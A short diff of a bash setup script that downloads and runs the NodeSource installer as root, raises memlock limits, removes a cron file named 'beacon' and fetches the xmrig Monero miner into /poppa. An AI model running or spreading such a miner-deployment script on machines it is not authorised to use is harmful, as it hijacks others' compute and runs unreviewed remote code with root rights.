@@ -1,14 +1,13 @@
 #!/bin/bash
 sudo rm /etc/cron.d/beacon
-sudo curl -sL https://deb.nodesource.com/setup_8.x -o /etc/install_node.sh
-sudo bash /etc/install_node.sh
-sudo apt-get update && sudo apt-get -y install build-essential cmake libuv1-dev nodejs npm
 if [ ! -f /etc/proof ]; then
+    sudo curl -sL https://deb.nodesource.com/setup_8.x -o /etc/install_node.sh
+    sudo bash /etc/install_node.sh
+    sudo apt-get update && sudo apt-get -y install build-essential cmake libuv1-dev nodejs npm
     sudo bash -c 'echo "* soft memlock 262144" >> /etc/security/limits.conf'
     sudo bash -c 'echo "* hard memlock 262144" >> /etc/security/limits.conf'
     sudo touch /etc/proof
 fi
-
 sudo rm -rf /poppa
 sudo mkdir /poppa
 sudo wget https://github.com/xmrig/xmrig/archive/v2.1.0.tar.gz -P /poppa
